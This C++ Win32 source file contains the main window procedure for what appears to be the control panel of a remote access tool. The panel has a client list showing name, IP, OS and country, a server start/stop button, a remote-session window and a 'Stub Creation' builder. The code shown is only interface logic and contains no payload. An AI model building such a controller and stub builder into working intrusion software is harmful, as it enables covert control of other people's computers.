#include "stdafx.h"
#include "MainProc.h"
#include "Theme.h"

void DeSelect(Theme::MData* mData, HWND Current);

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) //Main windows procedure
{
	Theme::MData* mData = (Theme::MData*)GetWindowLongPtr(hWnd, GWLP_USERDATA);

	switch (message)
	{
	case WM_NCHITTEST: //if window was clicked.
	{
		UINT uHitTest;


		uHitTest = DefWindowProc(hWnd, WM_NCHITTEST, wParam, lParam); //call default procedure for hittest. 
		if (uHitTest == HTCLIENT) //check if hit was in client area of window. 
			return HTCAPTION;




		return uHitTest;
	}
	break;
	case IDB_GETREMOTEHANDLE:
	{
		return (LRESULT)mData->HWND.rhWnd;
	}
	break;
	case IDB_REMOTE: //activate remote session.
	{
		ClientData* ActivatedRemoteClientInfo = (ClientData*)lParam; //get client data struct for remote activated item.
		((Winsock*)(mData->Winsock))->cHandler.ClientActivator(ActivatedRemoteClientInfo, ConnectionHandler::PacketType::tRemote); //call client activator with remote parameters. 
		
	}
	break;
	case WM_CREATE_REMOTE_WINDOW:
	{
		
		mData->HWND.rhWnd = CreateWindow(L"Remote", L"Remote Session", WS_POPUP  , CW_USEDEFAULT, CW_USEDEFAULT, 800, 600, NULL, nullptr, (HINSTANCE)GetModuleHandle(NULL), nullptr);


		return (LRESULT)mData->HWND.rhWnd;
	}
	break;
	case WM_CREATE:
	{
		mData = new Theme::MData(); //allocate new theme data. 
		if (mData == NULL)
			return FALSE;
		SetWindowLongPtr(hWnd, GWLP_USERDATA, (LONG_PTR)mData); //set theme data pointer to window.
		mData->HWND.Active = NULL;
		mData->Start = FALSE;
		RECT r = { NULL };
		r.left = 14;
		r.right = 0;
		mData->Build = FALSE;
		mData->bData.Applied = FALSE;
		mData->sData.Applied = FALSE;

	
		//create visible buttons on creation of main window.
		mData->HWND.Start = Theme::CWindow(r, L"Segoe UI", L"CBUTTON", L"Start",  WS_VISIBLE, 10, 34, 30, 15, hWnd, (HMENU)IDB_START);
		mData->HWND.BuildB = Theme::CWindow(r, L"Segoe UI", L"CBUTTON", L"Build", WS_VISIBLE, 646, 34, 26, 16, hWnd, (HMENU)IDB_BUILD);
		mData->HWND.SettingsB = Theme::CWindow(r, L"Segoe UI", L"CBUTTON", L"Settings", WS_VISIBLE, 687, 34, 45, 16, hWnd, (HMENU)IDB_SETTINGS);
		mData->HWND.Name = Theme::CWindow(r, L"Segoe UI", L"CBUTTON", L"Name", WS_VISIBLE, 44, 55, 31, 16, hWnd, (HMENU)IDB_NAME);
		mData->HWND.IP = Theme::CWindow(r, L"Segoe UI", L"CBUTTON", L"IP", WS_VISIBLE, 200, 55, 69, 16, hWnd, (HMENU)IDB_IP);
		mData->HWND.OpSys = Theme::CWindow(r, L"Segoe UI", L"CBUTTON", L"Operating System", WS_VISIBLE, 325, 55, 102, 16, hWnd, (HMENU)IDB_OPSYS);
		mData->HWND.Country = Theme::CWindow(r, L"Segoe UI", L"CBUTTON", L"Country", WS_VISIBLE, 520, 55, 49, 16, hWnd, (HMENU)IDB_COUNTRY);
		Theme::CWindow(r, NULL, L"CBUTTON", NULL, WS_VISIBLE | CS_EXIT, 768, 0, 30, 30, hWnd, (HMENU)IDM_EXIT);
		Theme::CWindow(r, NULL, L"CBUTTON", NULL, WS_VISIBLE | CS_MINI, 738, 0, 30, 30, hWnd, (HMENU)IDM_MINI);
		
		mData->HWND.ListView = CreateWindow(L"LV", NULL, WS_VISIBLE | WS_CHILD, 0, 75, 635, 255, hWnd, NULL, (HINSTANCE)GetModuleHandle(NULL), nullptr );

		//HWND rHwnd = CreateWindow(L"Remote", L"Remote Session", WS_POPUP | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, 800, 600, NULL, nullptr, (HINSTANCE)GetModuleHandle(NULL), nullptr);
		//SendMessage(mData->HWND.ListView, IDB_ADD, 0, 0);
		mData->Winsock = new Winsock(mData->HWND.ListView);
	}
	break;
	case WM_COMMAND:
	{
		int wmId = LOWORD(wParam);
		// Parse the menu selections:
		switch (wmId)
		{
		case IDM_MINI: //minimize button case.
		{
			//TODO: add check for minimize to tray.
			SendMessage(hWnd, WM_SYSCOMMAND, SC_MINIMIZE, NULL); //send minimize command to window. 
			break;
		}
		case IDB_START: //start/stop winsock server. 
			//SendMessage(mData->HWND.ListView, IDB_ADD, 0, 0);
			if (mData->Start){
				mData->Start = FALSE; //turn off
				SetWindowText(mData->HWND.Start, L"Start");
				((Winsock*)(mData->Winsock))->Deinitialize();
				SendMessage(mData->HWND.ListView, IDC_CLEAR, 0, 0);
			}
			else
			{
				mData->Start = TRUE; //turn on
				SetWindowText(mData->HWND.Start, L"Stop");
				((Winsock*)(mData->Winsock))->Initialize();

			}
			//TODO: activate sort on start if there is an active sort button.
			break;
		case IDB_ADD: //add item to list view. //don't think this is relevant anymore.. 
		{
			SendMessage(mData->HWND.ListView, IDB_ADD, 0, 0); //send add message to listview.
		}
			break;

		case IDB_BUILD: //build stub window popup.
		{
			if (lParam != IDB_BUILD) {
				if (!IsWindow(mData->HWND.BuildW)) { //check if already an active window.
					RECT rect;
					GetClientRect(GetDesktopWindow(), &rect);
					//create build window
					mData->HWND.BuildW = CreateWindow(L"StubCreation", L"Stub Creation", WS_POPUP, (rect.right - 400) / 2, 
						(rect.bottom - 400) / 2, 275, 180, hWnd, NULL, NULL, NULL);

					if (mData->HWND.BuildW == NULL) {
						return FALSE;
					}
					//get pointer to userdata struct
					Theme::Build* tmpPtrBuild = (Theme::Build*)GetWindowLongPtr(mData->HWND.BuildW, GWLP_USERDATA);
					tmpPtrBuild->HWND.Parent = hWnd;
					if (mData->bData.Applied)
						tmpPtrBuild->data = mData->bData;
				}
				ShowWindow(mData->HWND.BuildW, SW_SHOW);
				UpdateWindow(mData->HWND.BuildW);
				SendMessage(mData->HWND.BuildB, WM_MOUSEACTIVATE, 1, 1);

			}
			else { //get stub build settings and apply them to main data struct. 
				Theme::Build* tmpPtrBuild = (Theme::Build*)GetWindowLongPtr(mData->HWND.BuildW, GWLP_USERDATA);
				mData->bData = tmpPtrBuild->data;
			}
		}
		break;
		case IDB_SETTINGS: //settings window popup
			if (lParam != IDB_SETTINGS) {
				if (!IsWindow(mData->HWND.SettingsW)) { //check if already active window.
					RECT rect;
					GetClientRect(GetDesktopWindow(), &rect);
					mData->HWND.SettingsW = CreateWindow(L"Settings", L"Settings", WS_POPUP, (rect.right - 400) / 2,
						(rect.bottom - 400) / 2, 200, 100, hWnd, NULL, (HINSTANCE)GetModuleHandle(NULL), NULL);
					if (mData->HWND.SettingsW == NULL) {
						return FALSE;
					}
					//SetWindowLongPtr(mData->HWND.SettingsW, GWL_STYLE, WS_BORDER);
					Theme::Settings* tmpPtrSettings = (Theme::Settings*)GetWindowLongPtr(mData->HWND.SettingsW, GWLP_USERDATA);
					tmpPtrSettings->HWND.parent = hWnd;
					if (mData->sData.Applied)
						tmpPtrSettings->data = mData->sData;
				}
				ShowWindow(mData->HWND.SettingsW, SW_SHOW);
				UpdateWindow(mData->HWND.SettingsW);
				SendMessage(mData->HWND.SettingsB, WM_MOUSEACTIVATE, 1, 1);
			}
			else {//get settings data and apply them to main data struct.
				Theme::Settings* tmpPtrSettings = (Theme::Settings*)GetWindowLongPtr(mData->HWND.SettingsW, GWLP_USERDATA);
				mData->sData = tmpPtrSettings->data;
			}
			break;
		case IDB_NAME: //name button
			SendMessage(mData->HWND.ListView, IDB_NAME, 0, mData->HWND.Sort == mData->HWND.Name ? 1 : 0);
			DeSelect(mData, mData->HWND.Name);
			break;
		case IDB_IP: //IP button
			SendMessage(mData->HWND.ListView, IDB_IP, 0, mData->HWND.Sort == mData->HWND.IP ? 1 : 0);
			DeSelect(mData, mData->HWND.IP);
			break;
		case IDB_OPSYS: //Operating system button
			SendMessage(mData->HWND.ListView, IDB_OPSYS, 0, mData->HWND.Sort == mData->HWND.OpSys ? 1 : 0);
			DeSelect(mData, mData->HWND.OpSys);
			break;
		case IDB_COUNTRY: //country button
			SendMessage(mData->HWND.ListView, IDB_COUNTRY, 0, mData->HWND.Sort == mData->HWND.Country ? 1 : 0);
			DeSelect(mData, mData->HWND.Country);
			break;
		case IDM_EXIT: //exit button
			DestroyWindow(hWnd);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
	}
	break;
	case WM_PAINT: //case to draw all lines and formatting.
	{
		RECT rect;
		GetClientRect(hWnd, &rect);
		HANDLE Font = Theme::CreateCFont({ 0,0,0,0 }, L"Segoe UI");

		PAINTSTRUCT ps;
		HDC hdc = BeginPaint(hWnd, &ps);
		//HDC hdc = GetDC(hWnd);
		int iOldState = SaveDC(hdc);
		HPEN hp = CreatePen(PS_SOLID, 1, RGB(80, 80, 80));
		SelectObject(hdc, hp);

		MoveToEx(hdc, 678, 30, 0);
		LineTo(hdc, 678, 50);

		MoveToEx(hdc, 0, 30, 0);
		LineTo(hdc, 800, 30);

		MoveToEx(hdc, 0, 50, 0);
		LineTo(hdc, 800, 50);

		MoveToEx(hdc, 635, 30, 0);
		LineTo(hdc, 635, 330);

		MoveToEx(hdc, 0, 74, 0);
		LineTo(hdc, 635, 74);

		MoveToEx(hdc, 616, 30, 0);
		LineTo(hdc, 616, 330);

		MoveToEx(hdc, 0, 330, 0);
		LineTo(hdc, 800, 330);

		int i = rect.right / 2;
		SetTextColor(hdc, RGB(200, 200, 200));

		SelectObject(hdc, Font);
		SetBkColor(hdc, RGB(0x2C, 0x2C, 0x2C));
		//Theme::DrawTextC({i,0,0,15}, hdc, L"Lialis", 6, 1);


		WCHAR staticText[99];
		int len = SendMessage(hWnd, WM_GETTEXT,
			_ARRAYSIZE(staticText), (LPARAM)staticText);

		if (len == NULL)
			return FALSE;
		Theme::DrawTextC({ i,0,0,15 }, hdc, staticText, len, 1);

		RestoreDC(hdc, iOldState);
		EndPaint(hWnd, &ps);
		/*ReleaseDC(hWnd, hdcMem);
		ReleaseDC(hWnd, hdc);*/
	}
	break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}




void DeSelect(Theme::MData* mData, HWND Current) //Deactivate/activate buttons. 
{	
	SendMessage(mData->HWND.Active, WM_MOUSEACTIVATE, 1, 1);

	if (mData->HWND.Active != Current || mData->HWND.Sort == NULL)
		mData->HWND.Sort = Current;
	else
		mData->HWND.Sort = NULL;
	mData->HWND.Active = Current;
}